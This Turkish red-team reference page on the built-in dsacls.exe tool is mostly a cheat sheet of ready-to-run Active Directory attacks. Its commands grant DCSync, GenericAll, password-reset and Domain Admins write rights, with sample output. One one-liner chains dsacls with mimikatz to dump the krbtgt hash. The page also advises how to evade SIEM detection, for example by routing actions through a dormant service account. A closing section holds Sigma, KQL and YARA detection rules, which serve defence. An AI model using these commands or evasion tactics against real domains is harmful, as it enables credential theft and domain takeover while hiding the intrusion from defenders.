# dsacls

> **Kategori:** [9. ACL, GPO VE NESNE MANİPÜLASYONU (OBJECT, ACL & DELEGATION ABUSE)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Microsoft tarafından Windows Server ve RSAT araçları kapsamında yerleşik olarak sunulan; Active Directory nesnelerinin Güvenlik Tanımlayıcıları (Security Descriptor), Erişim Denetim Listeleri (DACL) ve Denetim Listelerini (SACL) üçüncü parti hiçbir araca ihtiyaç duymadan komut satırından sorgulayan, düzenleyen ve yöneten meşru sistem yönetim ikilisi (LOLBin).

---

## 1. Genel Bakış ve Amaç

Sızma testlerinde ve kırmızı takım operasyonlarında en kritik kısıtlamalardan biri uç noktalardaki güvenlik yazılımlarının (EDR, Antivirus, AMSI) harici derlenmiş araçları (`StandIn.exe`, `bloodyAD`) ve PowerShell betiklerini (`PowerView.ps1`) agresif biçimde engellemesidir. İkili dosya indirmenin yasak olduğu veya disk izleme sistemlerinin üst düzeyde alarm ürettiği ortamlarda operatörlerin başvuracağı en güvenli yol, işletim sisteminin meşru yerleşik araçlarını kullanmaktır (Living-off-the-Land - LOLBins).

**`dsacls.exe`**, Microsoft tarafından Windows işletim sistemlerinde Active Directory Dizin Hizmetleri (AD DS) nesnelerinin erişim haklarını yönetmek için geliştirilmiş yerel bir komut satırı aracıdır. Doğrudan Active Directory Hizmet Arabirimleri (ADSI) ve Win32 Güvenlik API'leri (`SetNamedSecurityInfo`, `GetNamedSecurityInfo`) üzerinden çalışır.

Kırmızı takım operatörleri için `dsacls`, hiçbir harici dosya yüklemeden hedef sistemde:
- Bir kullanıcıya hedef nesne üzerinde **`GenericAll` (Tam Denetim)** tanımlama,
- Etki alanı kökünde doğrudan **DCSync yetkisi** (`Replicating Directory Changes`) enjekte etme,
- Kullanıcı parolalarını sıfırlama izni (`Reset Password`) verme,
- Gruplara kendi kendini ekleme hakkı (`Write to Self`) tanıma,
- Ve en önemlisi, sızma testi tamamlandığında `/R` bayrağı ile tüm bu izinleri tek satırda geri alma (Revoke) imkanı sunar.

### İzin Kodları ve Sözdizimi Mimarisi

`dsacls` izin tanımlamalarında özel 2 harfli yetki kodları kullanır:
- **`GA` (Generic All):** Nesne üzerinde tam denetim (Full Control).
- **`GW` (Generic Write):** Nesnenin tüm özniteliklerine yazma hakkı.
- **`GR` (Generic Read):** Nesnenin tüm özniteliklerini okuma hakkı.
- **`WD` (Write DACL):** Nesnenin erişim denetim listesini değiştirme yetkisi.
- **`WO` (Write Owner):** Nesnenin sahipliğini devralma hakkı.
- **`RC` (Read Control):** İzinleri okuma hakkı.
- **`WS` (Write to Self):** Kendi adına yazma (Gruplara üye ekleme/çıkarma yetkisi).
- **`WP` (Write Property):** Belirli bir özniteliğe yazma.
- **`RP` (Read Property):** Belirli bir özniteliği okuma.
- **`CA` (Control Access / Extended Right):** Genişletilmiş denetim hakları (Parola sıfırlama, DCSync replikasyonu vb.).

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   KURBAN UÇ NOKTA (WINDOWS KOMUT İSTEMİ)               │
│                                                                        │
│  [ dsacls "DC=corp,DC=local" /G "CORP\jdoe:CA;Replicating Directory    │
│           Changes" "CORP\jdoe:CA;Replicating Directory Changes All" ]  │
│         │                                                              │
│         ├── (1) Microsoft İmzalı Meşru dsacls.exe Çağrılır (LOLBin)   │
│         │   └── Sıfır Antivirus / AMSI İmzası                         │
│         │                                                              │
│         ├── (2) ADSI ve Win32 Security API'leri Devreye Girer:        │
│         │       SetNamedSecurityInfoW()                                │
│         │                                                              │
│         ├── (3) LDAP / LDAPS (TCP 389/636) Üzerinden DC'ye İletilir:  │
│         │       Target: DC=corp,DC=local                               │
│         │       DACL: Add Access Allowed ACE for CORP\jdoe             │
│         │                                                              │
│         ▼                                                              │
│  [ ACTIVE DIRECTORY ETKİ ALANI DENETLEYİCİSİ (NTDS.DIT) ]              │
│         │                                                              │
│         ├── Dizin Nesnesinin nTSecurityDescriptor Alanı Güncellenir    │
│         │                                                              │
│         ▼                                                              │
│  [ jdoe Kullanıcısına Etki Alanı Genelinde DCSync Yetkisi Verildi! ]   │
│         │                                                              │
│         └── (4) Operasyon Sonrası İz Temizliği (Rollback):             │
│                 dsacls "DC=corp,DC=local" /R "CORP\jdoe"               │
│                 └── Eklenen İzinler Tek Komutla Geri Alınır            │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Kriter | Harici Araçlar (StandIn / bloodyAD) | Yerleşik dsacls.exe (LOLBin) |
|---|---|---|
| **Dosya İndirme Riski** | `.exe` veya Python komut dosyaları diske yazılır veya belleğe enjekte edilir. | İşletim sisteminde önceden mevcuttur; diske sıfır dosya indirilir. |
| **İmza Güvenilirliği** | Özel derlenmiş araçlar EDR bellek tarayıcıları tarafından sezgisel yakalanabilir. | Microsoft dijital imzasına sahiptir; meşru sistem yönetim aracıdır. |
| **DCSync Yetkilendirme**| Özel GUID eşleştirmeleri gerektirir. | Anlaşılır metin formatında (`CA;Replicating Directory Changes`) yetki verir. |
| **Geri Alma (Revoke)** | İzinleri manuel tek tek silmek karmaşıktır. | `/R <Trustee>` bayrağı ile ilgili kullanıcının tüm ek izinlerini tek adımda siler. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | dsacls | StandIn | bloodyAD | PowerView |
|---|---|---|---|---|
| **Geliştirme Dili** | C++ (Microsoft Native) | C# (.NET) | Python 3 | PowerShell |
| **Çalışma Platformu** | Windows (Yerleşik LOLBin) | Windows (Yerel Binary) | Linux / macOS / Windows | Windows (PowerShell) |
| **Dosya İndirme Zorunluluğu**| 🟢 Gerekmez (Yerleşik) | 🔴 İndirme / C2 gerekir | 🔴 Harici Python gerekir | 🔴 Script yükleme gerekir |
| **DCSync Desteği** | 🟢 Doğrudan Metin Adıyla | 🟢 Var (`--set-dcsync`) | 🟢 Var (`add dcsync`) | 🟢 Var |
| **İz Temizliği (Revoke)** | 🟢 Tek Bayrak (`/R`) | 🟡 Kısmi | 🟢 Var (`remove`) | 🔴 Karmaşık |
| **AMSI / Script Logging** | 🟢 Sıfır Etki (Native PE) | 🟢 Sıfır Etki (C#) | 🟢 Sıfır Etki (Ağ) | 🔴 Yüksek Alarm |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

dsacls, hedef nesnenin Distinguished Name (DN) değerini ve ardından işletilecek izin bayraklarını alır.

### Genel Sözdizimi

```cmd
dsacls "<Hedef_Nesne_DN>" [Miras_Seçenekleri] [/G <Hesap>:<İzinler>] [/D <Hesap>:<İzinler>] [/R <Hesap>]
```

### Desteklenen Kritik Parametreler ve Bayraklar

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `<Hedef_Nesne_DN>` | İşlem yapılacak Active Directory nesnesinin tam DN yolu (Tırnak içinde). | `"CN=Domain Admins,CN=Users,DC=corp,DC=local"` |
| `/G <Kullanıcı>:<İzin>` | Belirtilen kullanıcıya (Trustee) ilgili erişim izinlerini verir (Grant). | `/G "CORP\jdoe:GA"` |
| `/D <Kullanıcı>:<İzin>` | Belirtilen kullanıcının ilgili erişim izinlerini engeller (Deny). | `/D "CORP\jdoe:GW"` |
| `/R <Kullanıcı>` | Belirtilen kullanıcının hedef nesne üzerindeki TÜM izinlerini kaldırır (Revoke). | `/R "CORP\jdoe"` |
| `/I:T` | İzinlerin bu nesneye ve tüm alt nesnelerine miras bırakılmasını sağlar (Subtree). | `/I:T` |
| `/I:S` | İzinlerin yalnızca alt nesnelere geçmesini sağlar (Children only). | `/I:S` |
| `/I:P` | İzinlerin yalnızca bu nesneye uygulanmasını sağlar (This object only). | `/I:P` |
| `/P:Y` | Nesnenin üst kapsayıcılardan (OU/Domain) izin miras almasını engeller (Protect DACL). | `/P:Y` |
| `/P:N` | Nesnenin üst kapsayıcılardan izin miras almasına izin verir. | `/P:N` |
| `/A` | Güvenlik Denetim Listesi (SACL) ayarlarını görüntüler veya düzenler. | `/A` |

### İzin Kısaltmaları (Permissions List)

- **`GA`**: Generic All (Tam Yetki)
- **`GW`**: Generic Write (Genel Yazma)
- **`WD`**: Write DACL (İzin Değiştirme)
- **`WO`**: Write Owner (Sahiplik Değiştirme)
- **`WS`**: Write to Self (Grup üyeliği değiştirme)
- **`CA;<Hakkın_Adı>`**: Genişletilmiş Denetim Hakkı (`CA;Reset Password`, `CA;Replicating Directory Changes`)

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Etki Alanı Kökünde DCSync Yetkisi Tanımlama

Saldırganın elindeki standart `jdoe` kullanıcısına etki alanı kök nesnesi (`DC=corp,DC=local`) üzerinde DCSync haklarını tanımlayarak tüm parola karmalarını çalabilir hale getirmek:

```cmd
dsacls "DC=corp,DC=local" /G "CORP\jdoe:CA;Replicating Directory Changes" "CORP\jdoe:CA;Replicating Directory Changes All"
```

**Örnek Konsol Çıktısı Analizi:**

```text
C:\Windows\System32> dsacls "DC=corp,DC=local" /G "CORP\jdoe:CA;Replicating Directory Changes" "CORP\jdoe:CA;Replicating Directory Changes All"

Active Directory Service Interfaces (ADSI) Tool: dsacls.exe
Copyright (c) Microsoft Corporation. All rights reserved.

Target object: DC=corp,DC=local
Access list:
Effective Permissions on this object:
[Inherited from parent: False]
Allow CORP\jdoe              SPECIAL ACCESS for Replicating Directory Changes
Allow CORP\jdoe              SPECIAL ACCESS for Replicating Directory Changes All

The command completed successfully.
```

*Çıktı Yorumu:* `CORP\jdoe` kullanıcısına dizin replikasyon hakları verilmiştir. Bu komuttan sonra `mimikatz lsadump::dcsync /user:krbtgt` veya `secretsdump.py` çalıştırıldığında tüm domain hash'leri dökülebilir.

### Senaryo 2: Hedef Yönetici Hesabına Tam Denetim (GenericAll) İzni Verme

BloodHound üzerinde bir etki alanı yöneticisi hesabı (`da_admin`) üzerinde `WriteDacl` yetkisi elde edildiğinde, nesneye tam denetim eklemek:

```cmd
dsacls "CN=da_admin,OU=Admins,DC=corp,DC=local" /G "CORP\jdoe:GA"
```

Bu komuttan sonra `jdoe`, hedef yöneticinin tüm özniteliklerini değiştirebilir, parolasını sıfırlayabilir veya hesabına SPN ekleyebilir.

### Senaryo 3: Hedef Kullanıcıya Parola Sıfırlama (Reset Password) İzni Tanımlama

Kullanıcının yalnızca parolasını sıfırlama hakkı (`CA;Reset Password`) tanımlamak:

```cmd
dsacls "CN=target_user,OU=Users,DC=corp,DC=local" /G "CORP\jdoe:CA;Reset Password"
```

Bu işlem tamamlandığında `net user target_user NewComplexPassword! /domain` komutu standart kullanıcı tarafından başarıyla yürütülür.

### Senaryo 4: Hedef Grubun Mevcut DACL İzinlerini Sorgulama

`Domain Admins` grubu üzerinde kimlerin hangi yetkilere sahip olduğunu ekrana listelemek:

```cmd
dsacls "CN=Domain Admins,CN=Users,DC=corp,DC=local"
```

Konsolda tüm kullanıcılar ve izin maskeleri (Allow/Deny, Inherited, Object Types) listelenir.

### Senaryo 5: Operasyon Sonrası Eklenen İzinleri Güvenle Geri Alma (Revoke / Rollback)

Sızma testi bittikten sonra `jdoe` kullanıcısına etki alanı kökünde tanımlanan tüm DCSync haklarını tek komutla temizlemek:

```cmd
dsacls "DC=corp,DC=local" /R "CORP\jdoe"
```

**Örnek Konsol Çıktısı:**

```text
Access list:
Effective Permissions on this object:
Revoking all permissions for CORP\jdoe...
The command completed successfully.
```

*Çıktı Yorumu:* `CORP\jdoe` kullanıcısının etki alanı kökü üzerindeki tüm özel izinleri kaldırılmış, ortam sızma testi öncesindeki orijinal haline döndürülmüştür.

### Senaryo 6: Gruba Kendi Kendini Ekleme Yetkisi (Write to Self) Verme

Bir gruba üye eklemek için `WS` (Write to Self) iznini tanımlamak:

```cmd
dsacls "CN=HelpDeskAdmins,OU=Groups,DC=corp,DC=local" /G "CORP\jdoe:WS"
```

Bu izin sayesinde `jdoe`, `net group HelpDeskAdmins jdoe /add` komutu ile gruba kendisini başarıyla ekleyebilir.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Access is denied (Error 5)` | Komutu çalıştıran kullanıcının hedef nesne üzerinde `WriteDacl` veya `WriteOwner` izni bulunmamaktadır. | Hedef nesne üzerinde yazma yetkisine sahip doğru kullanıcı oturumu kullanılmalı veya önce nesne sahipliği ele geçirilmelidir. |
| `The specified object could not be found (Error 8333)` | Hedef nesnenin Distinguished Name (DN) yolu hatalıdır veya tırnak işaretleri eksiktir. | Nesnenin tam DN yolu `adfind` veya LDAP sorgusu ile doğrulanmalı; DN yolu mutlaka çift tırnak (`"..."`) içine alınmalıdır. |
| `Parameter format not correct / Invalid syntax` | İzin tanımlamasında sözdizimi hatası yapılmıştır (Örn: `/G CORP\user:GA` yerine tırnaksız kullanım veya iki nokta üst üste eksikliği). | Sözdizimi `/G "<Domain>\<Kullanıcı>:<İzin>"` formatına uygun olarak dikkatle yazılmalıdır. |
| `The name provided is not a properly formed account name` | Trustee olarak belirtilen kullanıcı adı NetBIOS etki alanı ön eki içermemektedir (Örn: `jdoe` yerine `CORP\jdoe` yazılmalıdır). | Kullanıcı adı her zaman etki alanı adı ile birlikte (`CORP\jdoe` veya `jdoe@corp.local`) verilmelidir. |
| `AdminCount=1 Protected Object Restriction` | Hedef nesne korumalı bir gruptadır (`AdminSDHolder` koruması altındadır); `dsacls` ile yapılan değişiklikler SDProp servisi tarafından saat başında sıfırlanır. | Korumalı hesaplar yerine korumasız hesaplar hedeflenmeli veya doğrudan `AdminSDHolder` nesnesi manipüle edilmelidir. |
| `Extended right name not recognized` | `CA;` sonrasına yazılan genişletilmiş hak adı Microsoft'un standart tanımlarıyla birebir eşleşmemektedir. | Hak adı tırnak içinde ve tam adıyla yazılmalıdır (Örn: `CA;Replicating Directory Changes`, `CA;Reset Password`). |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ İkili Dosya İzi ] : 🟢 SIFIR (Microsoft imzalı yerleşik LOLBin)     │
│  [ EDR Dosya Alarmı ]: 🟢 SIFIR (Diske yeni bir ikili dosya yazılmaz)  │
│  [ Komut Satırı İzi ]: 🔴 YÜKSEK (Event 4688 / Sysmon Event 1 İzlenir) │
│  [ DC Günlükleri ]   : 🔴 YÜKSEK (Event 5136 nTSecurityDescriptor)     │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Uç Nokta Süreç Oluşturma Günlükleri (Process Creation):**
   - **Event ID 4688 / Sysmon Event ID 1:**
     - `ProcessName: C:\Windows\System32\dsacls.exe`
     - `CommandLine: dsacls "DC=..." /G "CORP\jdoe:CA;Replicating Directory Changes"`
     - **EDR Sezgisel Alarmı:** EDR yazılımları `dsacls.exe` sürecini engellemez ancak komut satırında geçen `Replicating Directory Changes`, `:GA` veya `:CA;Reset Password` dizgilerini açıkça imzalar.
2. **Domain Controller Dizin Değişiklik Günlükleri:**
   - **Event ID 5136 (Directory Service Object Modified):**
     - Etki alanı kök nesnesi veya hedef kullanıcı nesnesinin `nTSecurityDescriptor` özniteliğinin değiştirilmesi.
   - **Event ID 4662 (An operation was performed on an object):**
     - Özel erişim haklarının (DCSync) atandığı anı kaydeder.

### 5.2 Ağ ve EDR İmzaları

- **LOLBin Davranışı:** Aracın kendisi beyaz listede (Whitelisted) olduğu için antivirüs taramasından muaftır; ancak SIEM komut satırı korelasyonu kritiktir.
- **LDAP Ağ Trafiği:** `dsacls.exe`, doğrudan ADSI üzerinden LDAP (Port 389/636) paketleri gönderir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1218** | System Binary Proxy Execution | Microsoft yerleşik aracı üzerinden izin manipülasyonu yapılması (LOLBin). |
| **T1098** | Account Manipulation | Nesne DACL'lerinin, sahipliğin ve izinlerin değiştirilmesi. |
| **T1003.006** | OS Credential Dumping: DCSync | Etki alanı köküne replikasyon izinleri enjekte edilmesi. |
| **T1078.002** | Valid Accounts: Domain Accounts | Yetkilendirilen meşru hesaplarla etki alanında oturum açılması. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Komut Satırı Argüman Tespiti** | SIEM sistemleri `dsacls` komut satırındaki `:GA` veya `Replicating` dizgilerini doğrudan izler. Çok sıkı izlenen uç noktalarda `dsacls` yerine C# ile bellekte çalışan [StandIn](./StandIn.md) tercih edilmelidir. |
| **Kalıcı İzin İzi** | DCSync veya GenericAll yetkisi kullanıldıktan hemen sonra mutlaka `dsacls ... /R <Trustee>` komutu ile izinler temizlenmelidir. |
| **Kapsamlı Değişiklikler** | `/I:T` bayrağı ile tüm alt nesnelere miras bırakmak binlerce alt nesnede Event 5136 tetikleyebilir. Yalnızca hedeflenen tekil nesneyi (`/I:P`) değiştirin. |
| **Yönetici Hesabı Taklidi** | İzin verirken doğrudan saldırgan hesabı yerine, ortamda önceden pasif kalmış meşru bir servis hesabını yetkilendirip o hesap üzerinden sıçrayın. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: dsacls ile Şüpheli DCSync veya GenericAll İzni Tanımlanması Tespiti

```yaml
title: Suspicious dsacls Execution Granting Sensitive Permissions
id: a9123841-4912-4c20-a912-38910245fe01
status: experimental
description: Detects dsacls.exe command lines granting DCSync rights or Full Control (GenericAll) to Active Directory objects.
author: Modul 11 Security Research
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\dsacls.exe'
  selection_flags:
    CommandLine|contains:
      - 'Replicating Directory Changes'
      - ':GA'
      - ':CA;Reset Password'
      - 'Write to Self'
  condition: selection_img and selection_flags
falsepositives:
  - Legitimate AD DS forest preparation or exchange installation scripts
level: critical
tags:
  - attack.credential_access
  - attack.t1003.006
  - attack.t1098
```

#### Microsoft Sentinel KQL Sorgusu: dsacls Süreci Tarafından Tetiklenen Event 5136 Korelasyonu

```kql
// dsacls.exe süreci ile etki alanı kök nesnesinde nTSecurityDescriptor değiştirilmesi
SecurityEvent
| where TimeGenerated > ago(2h)
| where EventID == 4688 and Process has_any ("dsacls.exe", "dsacls")
| where CommandLine has_any ("Replicating", ":GA", ":WD", ":WO")
| project CmdTime = TimeGenerated, Computer, SubjectUserName, Process, CommandLine
| join kind=inner (
    SecurityEvent
    | where TimeGenerated > ago(2h)
    | where EventID == 5136 and AttributeLDAPDisplayName == "nTSecurityDescriptor"
    | project ModTime = TimeGenerated, ObjectDN, SubjectUserName
) on SubjectUserName
| where ModTime between (CmdTime .. (CmdTime + 5m))
| project CmdTime, ModTime, Computer, SubjectUserName, ObjectDN, CommandLine
```

#### YARA Kuralı: dsacls Komut Satırı ve Sömürü Betikleri Tespiti

```yara
rule PostExploit_dsacls_DCSync_Pattern {
    meta:
        description = "Detects batch or script files executing dsacls DCSync privilege injection"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "dsacls" ascii wide nocase
        $s2 = "Replicating Directory Changes" ascii wide
        $s3 = "Replicating Directory Changes All" ascii wide
        $s4 = ":GA" ascii wide
        $s5 = "/G" ascii wide
    condition:
        $s1 and ($s2 or $s3 or ($s4 and $s5))
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Etki Alanı Kökünde DCSync Yetkisi Tanımlama
```cmd
dsacls "DC=corp,DC=local" /G "CORP\jdoe:CA;Replicating Directory Changes" "CORP\jdoe:CA;Replicating Directory Changes All"
```
- **Ne Yapar?** `jdoe` kullanıcısına etki alanı genelinde dizin replikasyon (DCSync) yetkisi tanımlar.
- **Ne Zaman Kullanılır?** Etki alanı kökünde `WriteDacl` izni olduğunda anında tüm domain hash'lerini çalmak için.
- **Parametreler:** `/G`: İzin verme, `CA;Replicating...`: Replikasyon genişletilmiş hakkı.

### Komut 2: Hedef Kullanıcıya Tam Denetim (GenericAll) İzni Verme
```cmd
dsacls "CN=target_user,OU=Users,DC=corp,DC=local" /G "CORP\jdoe:GA"
```
- **Ne Yapar?** Hedef nesne üzerinde `jdoe` kullanıcısına tam yetki (`GenericAll`) verir.
- **Ne Zaman Kullanılır?** Nesne üzerinde `WriteDacl` yetkisi elde edildiğinde.
- **Parametreler:** `:GA`: GenericAll kısaltması.

### Komut 3: Hedef Nesne Üzerindeki Tüm İzinleri Geri Alma (Revoke / Temizlik)
```cmd
dsacls "DC=corp,DC=local" /R "CORP\jdoe"
```
- **Ne Yapar?** Belirtilen kullanıcının hedef nesne üzerindeki TÜM izinlerini kaldırır.
- **Ne Zaman Kullanılır?** Sızma testi tamamlandığında verilen DCSync veya nesne haklarını temizlemek için.
- **Parametreler:** `/R`: Revoke (İptal etme) bayrağı.

### Komut 4: Hedef Kullanıcıya Parola Sıfırlama Hakkı Verme
```cmd
dsacls "CN=da_admin,OU=Admins,DC=corp,DC=local" /G "CORP\jdoe:CA;Reset Password"
```
- **Ne Yapar?** Hedef yönetici hesabının parolasını sıfırlama iznini tanımlar.
- **Ne Zaman Kullanılır?** Parola değiştirme yetkisiyle hesabı ele geçirmek istendiğinde.
- **Parametreler:** `CA;Reset Password`: Parola sıfırlama hakkı.

### Komut 5: Gruba Kendi Kendini Ekleme Yetkisi (Write to Self) Verme
```cmd
dsacls "CN=Domain Admins,CN=Users,DC=corp,DC=local" /G "CORP\jdoe:WS"
```
- **Ne Yapar?** `jdoe` kullanıcısına `Domain Admins` grubuna üye ekleme/çıkarma yetkisi verir.
- **Ne Zaman Kullanılır?** Grup üzerinde `WriteDacl` yetkisi olduğunda doğrudan grup üyesi olmak için.
- **Parametreler:** `:WS`: Write to Self (Grup üyeliği yazma).

### Komut 6: Hedef Nesnenin Mevcut İzin Listesini Görüntüleme
```cmd
dsacls "CN=Domain Admins,CN=Users,DC=corp,DC=local"
```
- **Ne Yapar?** Nesne üzerindeki tüm izin denetim girdilerini (DACL) ekrana döker.
- **Ne Zaman Kullanılır?** Nesne üzerinde kimlerin hangi haklara sahip olduğunu denetlemek için.
- **Parametreler:** Yalnızca nesne DN'i belirtilir.

### Komut 7: Sahiplik Ele Geçirme (Write Owner) İzni Tanımlama
```cmd
dsacls "CN=target_object,OU=Devices,DC=corp,DC=local" /G "CORP\jdoe:WO"
```
- **Ne Yapar?** Hedef nesnenin sahipliğini değiştirme hakkı (`WriteOwner`) verir.
- **Ne Zaman Kullanılır?** Nesne sahipliğini devralarak tam kontrole geçmek istendiğinde.
- **Parametreler:** `:WO`: Write Owner kısaltması.

### Komut 8: İzinlerin Yalnızca Bu Nesneye Uygulanması (Miras Kısıtlama)
```cmd
dsacls "CN=target_user,OU=Users,DC=corp,DC=local" /I:P /G "CORP\jdoe:GA"
```
- **Ne Yapar?** İznin alt nesnelere geçmesini engeller, yalnızca belirtilen tekil nesneye uygular.
- **Ne Zaman Kullanılır?** Alt nesnelerde gereksiz log ve telemetri oluşturmamak için.
- **Parametreler:** `/I:P`: This object only (Yalnızca bu nesne).

### Komut 9: Üst Kapsayıcıdan Miras Almayı Kapatma (Protect DACL)
```cmd
dsacls "CN=Confidential_Group,OU=Groups,DC=corp,DC=local" /P:Y
```
- **Ne Yapar?** Nesnenin üst OU'dan gelen miras izinlerini devralmasını engeller.
- **Ne Zaman Kullanılır?** Bir nesneyi üst yöneticilerin miras denetiminden yalıtmak için.
- **Parametreler:** `/P:Y`: Miras korumasını etkinleştirir.

### Komut 10: Zincirleme DCSync Tanımlama ve Anında Hash Hasadı
```cmd
dsacls "DC=corp,DC=local" /G "CORP\jdoe:CA;Replicating Directory Changes" "CORP\jdoe:CA;Replicating Directory Changes All" && mimikatz.exe "lsadump::dcsync /user:krbtgt" exit
```
- **Ne Yapar?** Tek satırda DCSync iznini verir ve hemen ardından Mimikatz ile krbtgt hash'ini çeker.
- **Ne Zaman Kullanılır?** Hızlı sızma testi senaryolarında anında Golden Ticket verisi elde etmek için.
- **Parametreler:** Komut zincirleme (`&&`).

---

## Kaynaklar

- **Microsoft Resmi Dokümantasyonu:** [dsacls Command-Line Reference](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11))
- **SpecterOps ACL Araştırması:** [Active Directory DACL Exploitation](https://posts.specterops.io/)
- **LOLBAS Projesi:** [Living Off The Land Binaries and Scripts](https://lolbas-project.github.io/)
- **MITRE ATT&CK Referansı:** [T1218 - System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)

---

> **Önceki:** [← StandIn](./StandIn.md) · **Sonraki:** [Incognito →](./Incognito.md)
